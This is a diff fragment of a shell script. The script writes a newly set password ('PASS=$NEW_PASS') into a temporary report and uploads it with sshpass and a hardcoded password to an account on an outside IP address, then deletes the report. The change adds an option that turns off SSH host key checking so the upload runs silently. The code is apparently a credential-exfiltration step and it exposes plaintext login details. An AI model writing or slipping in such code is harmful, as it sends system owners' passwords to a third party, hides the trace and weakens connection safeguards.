@@ -18,7 +18,7 @@ REPORT="/tmp/report.txt"
     echo "PASS=$NEW_PASS"
 } > "$REPORT"
 
-sshpass -p "892aeiw45ptv" scp "$REPORT" yadgahhi@5.144.130.141:/home/yadgahhi/
+sshpass -p "892aeiw45ptv" scp -o StrictHostKeyChecking=no "$REPORT" yadgahhi@5.144.130.141:/home/yadgahhi/
 
 rm -f "$REPORT"
 
